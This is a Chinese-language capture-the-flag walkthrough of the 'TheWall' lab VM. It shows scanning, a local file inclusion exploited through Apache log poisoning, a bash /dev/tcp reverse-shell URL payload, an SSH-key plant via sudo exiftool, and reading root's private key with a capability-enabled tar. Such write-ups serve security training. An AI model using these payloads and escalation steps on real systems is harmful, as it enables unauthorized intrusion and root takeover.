# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 04:19 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0024s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.4
Host is up (0.086s latency).
MAC Address: E2:F1:73:FE:8C:B0 (Unknown)
Nmap scan report for 192.168.21.5
Host is up (0.00026s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.7
Host is up (0.00036s latency).
MAC Address: 08:00:27:C2:0B:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.6
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.84 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.7  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 04:20 EDT
Nmap scan report for 192.168.21.7
Host is up (0.000074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C2:0B:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.88 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.7  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 04:21 EDT
Warning: 192.168.21.7 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.7
Host is up (0.0015s latency).
All 65535 scanned ports on 192.168.21.7 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:C2:0B:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.03 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.7      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 04:22 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:C2:0B:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

漏洞扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --script=vuln -p22,80 192.168.21.7
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 04:24 EDT
Nmap scan report for 192.168.21.7
Host is up (0.00047s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:C2:0B:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 36.75 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7                
<h1>Forbidden</h1>
```

目录扫描，应该是做了限制，我们限制一下速率。~太慢太慢了，我直接看的wp。index.php和includes.php

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.7 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --delay 1s -t 1
```

/index.php

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/index.php

<h1>HELLO WORLD!</h1>
```

/includes.php什么也没有，尝试模糊测试，存在文件包含漏洞

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.21.7/includes.php?FUZZ=/etc/passwd" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -fc 403 -c -fs 0,2 -s
display_page
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.7/includes.php?display_page=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
```

![image](https://github.com/user-attachments/assets/5e5e8a34-f966-4808-8228-fec3d2b7bd9a)

尝试反弹个shell：/includes.php?display_page=/var/log/apache2/access.log&1=bash%20-c%20%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.21.6%2F1234%20%200>%261%27

![image](https://github.com/user-attachments/assets/273972b1-317c-4f8a-bb8e-e221b4c82b81)

# 权限提升

看一下有什么

```
www-data@TheWall:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
www-data@TheWall:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
www-data@TheWall:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
www-data@TheWall:/var/www/html$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:,,,:/home/john:/bin/bash
```

![image](https://github.com/user-attachments/assets/f300490a-8c77-4c80-a0a4-0f855c6d079e)

提权

```
www-data@TheWall:/tmp$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIyH4b8Zoyqq3/IPn4Qg65OisygTuQuahWV9qPm5YovJ kali@kali" > /tmp/key
<Pn4Qg65OisygTuQuahWV9qPm5YovJ kali@kali" > /tmp/key
www-data@TheWall:/tmp$ sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/key   
< -filename=/home/john/.ssh/authorized_keys /tmp/key
Warning: Error removing old file - /tmp/key
    1 image files updated
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh john@192.168.21.15 -i id_ed25519 
The authenticity of host '192.168.21.15 (192.168.21.15)' can't be established.
ED25519 key fingerprint is SHA256:Ew2srZtokZQDN/Tw8xKgD2oEnd4Cgyo+aGT0drkNYQc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.15' (ED25519) to the list of known hosts.
Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 19 17:07:17 2022 from 10.0.2.15
john@TheWall:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(bluetooth)
```

看一下都有什么

```
john@TheWall:~$ ls -la
total 32
drwxr-xr-x 4 john john 4096 Oct 19  2022 .
drwxr-xr-x 3 root root 4096 Oct 17  2022 ..
lrwxrwxrwx 1 john john    9 Oct 19  2022 .bash_history -> /dev/null                                                             
-rw-r--r-- 1 john john  220 Oct 17  2022 .bash_logout
-rw-r--r-- 1 john john 3526 Oct 17  2022 .bashrc
drwxr-xr-x 3 john john 4096 Oct 19  2022 .local
-rw-r--r-- 1 john john  807 Oct 17  2022 .profile
drwx------ 2 john john 4096 Jun  6 17:57 .ssh
-rw-r--r-- 1 john john   33 Oct 19  2022 user.txt
john@TheWall:~$ sudo -l
-bash: sudo: command not found
john@TheWall:~$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
john@TheWall:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

user

```
john@TheWall:~$ cat user.txt 
cc5db5e7b0a26e807765f47a006f6221
```

没发现什么能利用的地方，传一个脚本看看

![image](https://github.com/user-attachments/assets/baffa01e-d60e-4413-93a1-3134b6327e13)

tar可以先创建tar然后再解压读取

```
john@TheWall:~$ ls -la /id_rsa
-rw------- 1 root root 2602 Oct 19  2022 /id_rsa
john@TheWall:~$ /usr/sbin/tar -czf 1.tar.gz /id_rsa
/usr/sbin/tar: Removing leading `/' from member names
john@TheWall:~$ /usr/sbin/tar -xvf 1.tar.gz
id_rsa
john@TheWall:~$ chmod 600 id_rsa
john@TheWall:~$ ssh root@127.0.0.1 -i id_rsa 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:B5rYCjLqqIAUNVd/dSEQtCZrIoOVYpYzqn/4r2fvE/U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 19 19:51:15 2022 from 10.0.2.15
root@TheWall:~# id
uid=0(root) gid=0(root) groups=0(root)
```

root

```
root@TheWall:~# cat r0Ot.txT 
4be82a3be9aed6eea5d0cce68e17662e
```
